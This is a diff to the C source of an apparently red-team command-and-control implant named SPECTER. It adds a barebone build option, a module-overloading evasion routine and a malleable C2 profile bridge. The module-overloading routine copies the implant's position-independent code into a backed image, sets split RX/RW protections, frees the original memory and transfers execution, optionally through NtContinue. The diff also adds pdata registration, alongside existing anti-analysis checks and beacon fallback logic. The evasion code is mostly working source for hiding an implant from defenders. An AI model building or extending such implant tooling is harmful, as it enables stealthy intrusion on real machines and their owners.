@@ -15,14 +15,21 @@
 #include "comms.h"
 #include "sleep.h"
 #include "evasion.h"
+#ifndef SPECTER_BAREBONE
 #include "antianalysis.h"
+#endif
 #include "profile.h"
+#ifndef SPECTER_BAREBONE
 #include "bus.h"
+#endif
 #include "task_exec.h"
 
 /* Implant context — file-scope static, no extern cross-TU references.
    All subsystems receive a pointer to this via init functions. */
 static IMPLANT_CONTEXT g_ctx;
+#ifndef SPECTER_BAREBONE
+static PROFILE_CONFIG g_profile_cfg;
+#endif
 
 /* Phase 0.4: Build flags marker (SPBF) removed.
    Anti-analysis and debug mode are now controlled entirely by compile-time
@@ -31,6 +38,18 @@ static IMPLANT_CONTEXT g_ctx;
 
 /* Forward declarations for cleanup */
 static void implant_cleanup(void);
+typedef void (__attribute__((ms_abi)) *fn_pic_entry)(PVOID param);
+
+/* Lab sentinel used to prevent a copied module-overload instance from
+   recursively overloading itself again. */
+#define MODULE_OVERLOAD_TRANSFER_MAGIC    ((ULONG_PTR)0x53504D4FUL)
+#define MODULE_OVERLOAD_RW_OFFSET         ((SIZE_T)0x19000)
+
+typedef struct _MODULE_OVERLOAD_TRANSFER_INFO {
+    ULONG_PTR magic;
+    PVOID original_base;
+    SIZE_T original_size;
+} MODULE_OVERLOAD_TRANSFER_INFO;
 
 /* Dev build: resolve ExitProcess + OutputDebugStringA for diagnostics */
 #ifdef SPECTER_DEV_BUILD
@@ -83,7 +102,10 @@ static void dev_init_exit(PVOID k32) {
 
 __attribute__((section(".text$A")))
 void implant_entry(PVOID param) {
-    (void)param;
+    MODULE_OVERLOAD_TRANSFER_INFO *transfer_info =
+        (MODULE_OVERLOAD_TRANSFER_INFO *)param;
+    BOOL module_overload_transferred =
+        (transfer_info && transfer_info->magic == MODULE_OVERLOAD_TRANSFER_MAGIC);
     NTSTATUS status;
 
     /* ---- Zero out global context ---- */
@@ -131,11 +153,29 @@ void implant_entry(PVOID param) {
     /* ---- Step 3b.1: Initialize syscall wrappers with context ---- */
     syscall_wrappers_init(&g_ctx);
 
+    if (module_overload_transferred && transfer_info->original_base) {
+        PVOID free_base = transfer_info->original_base;
+        SIZE_T free_size = 0;
+        status = spec_NtFreeVirtualMemory(
+            (HANDLE)-1,
+            &free_base,
+            &free_size,
+            MEM_RELEASE
+        );
+        if (NT_SUCCESS(status)) {
+            transfer_info->original_base = NULL;
+            DEV_TRACE("[SPECTER] original private view released");
+        } else {
+            DEV_TRACE_VAL("[SPECTER] original private view release FAILED",
+                          (DWORD)(status & 0xFFFF));
+        }
+    }
+
     /* ---- Step 3c: Anti-analysis checks ---- */
     /* Anti-analysis runs BEFORE config is loaded.  The compile-time
        SPECTER_DEV_BUILD flag gates this check.  Runtime skip via
        config BUILD_FLAGS TLV (0x8A) is available after cfg_init. */
-#ifndef SPECTER_DEV_BUILD
+#if !defined(SPECTER_DEV_BUILD) && !defined(SPECTER_BAREBONE)
     {
         ANTIANALYSIS_CONFIG aa_cfg;
         ANALYSIS_RESULT aa_result;
@@ -163,9 +203,11 @@ void implant_entry(PVOID param) {
     }
 
     /* ---- Step 4b: Module overloading (post-config) ---- */
+#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULE_OVERLOAD)
     {
         IMPLANT_CONFIG *icfg = cfg_get(&g_ctx);
-        if (icfg && (icfg->evasion_flags & EVASION_FLAG_MODULE_OVERLOAD)) {
+        if (icfg && !module_overload_transferred &&
+            (icfg->evasion_flags & EVASION_FLAG_MODULE_OVERLOAD)) {
             PVOID overload_base = NULL;
             SIZE_T overload_size = 0;
             EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
@@ -177,18 +219,98 @@ void implant_entry(PVOID param) {
                    can be freed by the caller. */
                 extern void implant_entry(PVOID);
                 PVOID pic_base = (PVOID)implant_entry;
-                /* Estimate PIC size from config scan limit */
-                SIZE_T pic_size = CONFIG_SCAN_MAX;
+                SIZE_T pic_size = cfg_get_payload_size();
+                if (pic_size == 0)
+                    pic_size = CONFIG_SCAN_MAX;
                 if (pic_size > overload_size)
                     pic_size = overload_size;
-                spec_memcpy(overload_base, pic_base, pic_size);
+                PVOID copied_base = overload_base;
+                SIZE_T copied_size = overload_size;
 
-                /* Flip the overloaded section from RW → RX now that
-                   the PIC blob has been copied in. */
-                evasion_module_overload_finalize(ectx, overload_base, pic_size);
+                if (icfg->evasion_flags & EVASION_FLAG_MODULE_PRESERVE_HEADERS) {
+                    status = evasion_module_overload_find_exec_range(
+                        overload_base,
+                        overload_size,
+                        pic_size,
+                        &copied_base,
+                        &copied_size
+                    );
+                    if (NT_SUCCESS(status)) {
+                        DEV_TRACE("[SPECTER] module overload preserve headers");
+                    } else {
+                        copied_base = overload_base;
+                        copied_size = overload_size;
+                        DEV_TRACE_VAL("[SPECTER] module preserve headers unavailable",
+                                      (DWORD)(status & 0xFFFF));
+                    }
+                }
+
+                spec_memcpy(copied_base, pic_base, pic_size);
+
+                status = evasion_module_overload_finalize_split(
+                    ectx,
+                    copied_base,
+                    copied_size,
+                    pic_size,
+                    icfg->module_overload_rw_offset
+                        ? (SIZE_T)icfg->module_overload_rw_offset
+                        : MODULE_OVERLOAD_RW_OFFSET
+                );
+                if (!NT_SUCCESS(status))
+                    DEV_TRACE_VAL("[SPECTER] module overload split protect FAILED",
+                                  (DWORD)(status & 0xFFFF));
+
+                if ((icfg->evasion_flags & EVASION_FLAG_MODULE_PRESERVE_HEADERS) &&
+                    copied_base != overload_base) {
+                    PVOID header_base = overload_base;
+                    SIZE_T header_size = (SIZE_T)((BYTE *)copied_base - (BYTE *)overload_base);
+                    DWORD old_protect = 0;
+                    status = spec_NtProtectVirtualMemory(
+                        (HANDLE)-1,
+                        &header_base,
+                        &header_size,
+                        PAGE_READONLY,
+                        &old_protect
+                    );
+                    if (!NT_SUCCESS(status))
+                        DEV_TRACE_VAL("[SPECTER] module header protect FAILED",
+                                      (DWORD)(status & 0xFFFF));
+                }
+
+                if (icfg->evasion_flags & EVASION_FLAG_MODULE_PATCH_ONLY) {
+                    DEV_TRACE("[SPECTER] module overload patch-only canary");
+                } else {
+                    MODULE_OVERLOAD_TRANSFER_INFO transfer;
+                    transfer.magic = MODULE_OVERLOAD_TRANSFER_MAGIC;
+                    transfer.original_base = cfg_get_pic_base();
+                    if (!transfer.original_base)
+                        transfer.original_base = pic_base;
+                    transfer.original_size = pic_size;
+
+#ifndef SPECTER_BAREBONE
+                    if (icfg->evasion_flags & EVASION_FLAG_NTCONTINUE_ENTRY) {
+                        DEV_TRACE("[SPECTER] module overload NtContinue transfer");
+                        status = evasion_ntcontinue_transfer(
+                            ectx,
+                            copied_base,
+                            &transfer
+                        );
+                        DEV_TRACE_VAL("[SPECTER] NtContinue transfer FAILED",
+                                      (DWORD)(status & 0xFFFF));
+                    }
+#endif
+
+                    /* Lab transfer fallback: enter the copied PIC from the backed
+                       image view. The copied view is split RX/RW using the current
+                       lab build's mutable-state offset. */
+                    DEV_TRACE("[SPECTER] module overload transfer");
+                    ((fn_pic_entry)copied_base)(&transfer);
+                    return;
+                }
             }
         }
 
+#ifndef SPECTER_BAREBONE
         /* NtContinue entry transfer: re-enter the main loop from a
            clean thread context with synthetic stack frames */
         if (icfg && (icfg->evasion_flags & EVASION_FLAG_NTCONTINUE_ENTRY)) {
@@ -196,7 +318,25 @@ void implant_entry(PVOID param) {
                complete — see below after comms_init.  Flag is checked
                after the main loop setup. */
         }
+#endif
     }
+#endif
+
+#ifndef SPECTER_BAREBONE
+    {
+        IMPLANT_CONFIG *pcfg = cfg_get(&g_ctx);
+        if (pcfg && (pcfg->evasion_flags & EVASION_FLAG_PDATA_REGISTER)) {
+            EVASION_CONTEXT *ectx = (EVASION_CONTEXT *)g_ctx.evasion_ctx;
+            PVOID pic_base_for_pdata = cfg_get_pic_base();
+            status = evasion_register_pdata(ectx, pic_base_for_pdata);
+            if (NT_SUCCESS(status))
+                DEV_TRACE("[SPECTER] pdata registration OK");
+            else
+                DEV_TRACE_VAL("[SPECTER] pdata registration FAILED",
+                              (DWORD)(status & 0xFFFF));
+        }
+    }
+#endif
 
     /* ---- Step 5: Check kill date before proceeding ---- */
     if (cfg_check_killdate(&g_ctx))
@@ -233,6 +373,7 @@ void implant_entry(PVOID param) {
     DEV_TRACE("[SPECTER] comms_init OK — first checkin succeeded");
 
     /* ---- Step 7a: Initialize module bus ---- */
+#if !defined(SPECTER_BAREBONE) || defined(SPECTER_BAREBONE_MODULES)
     DEV_TRACE("[SPECTER] bus_init...");
     status = bus_init(&g_ctx);
     if (!NT_SUCCESS(status)) {
@@ -258,12 +399,41 @@ void implant_entry(PVOID param) {
             DEV_TRACE("[SPECTER] modmgr_init OK");
         }
     }
+#else
+    g_ctx.module_bus = NULL;
+    DEV_TRACE("[SPECTER] barebone build: module bus disabled");
+#endif
 
-    /* ---- Step 7b: Initialize malleable C2 profile ---- */
-    /* PHASE 0 STABILIZATION: Malleable C2 profile disabled — the profile-driven
-       transform/embed chain crashes under the current comms architecture. Using
-       legacy wire format until Phase 1.3 debugging is complete. See roadmap.md. */
-    DEV_TRACE("[SPECTER] profile disabled (Phase 0), using legacy wire format");
+    /* ---- Step 7b: Initialize malleable C2 profile (Phase 1.3 minimal bridge) ---- */
+#ifndef SPECTER_BAREBONE
+    {
+        IMPLANT_CONFIG *cfg = cfg_get(&g_ctx);
+        if (cfg && cfg->profile_blob && cfg->profile_blob_len > 0) {
+            spec_memset(&g_profile_cfg, 0, sizeof(g_profile_cfg));
+            status = profile_init(cfg->profile_blob, cfg->profile_blob_len, &g_profile_cfg);
+            if (NT_SUCCESS(status)) {
+                status = comms_set_profile(&g_ctx, &g_profile_cfg);
+                if (NT_SUCCESS(status)) {
+                    DEV_TRACE("[SPECTER] profile_init/comms_set_profile OK");
+                } else {
+                    DEV_TRACE_VAL("[SPECTER] comms_set_profile FAILED", (DWORD)(status & 0xFFFF));
+                    DEV_TRACE("[SPECTER] falling back to legacy comms baseline");
+                }
+            } else {
+                /* Operationally safe fallback: keep beacon alive on legacy comms path
+                   when profile parse/transform metadata is invalid.
+                   Does not catch runtime faults later in the profile chain — validate
+                   against your beacon crash-repro checklist before production. */
+                DEV_TRACE_VAL("[SPECTER] profile_init FAILED", (DWORD)(status & 0xFFFF));
+                DEV_TRACE("[SPECTER] profile fallback to legacy comms baseline");
+            }
+        } else {
+            DEV_TRACE("[SPECTER] no profile blob present; using legacy comms baseline");
+        }
+    }
+#else
+    DEV_TRACE("[SPECTER] barebone build: profile wire path disabled");
+#endif
 
     /* ---- Step 8: Enter main loop ---- */
     g_ctx.running = TRUE;
@@ -343,12 +513,14 @@ void implant_entry(PVOID param) {
 
 static void implant_cleanup(void) {
     /* Shut down module bus subsystems (kill running modules, remove VEH) */
+#ifndef SPECTER_BAREBONE
     if (g_ctx.module_bus) {
         MODULE_MANAGER *mgr = modmgr_get();
         if (mgr)
             modmgr_shutdown(mgr);
         guardian_shutdown();
     }
+#endif
 
     /* Free any remaining pending tasks and results */
     task_free_pending(&g_ctx);
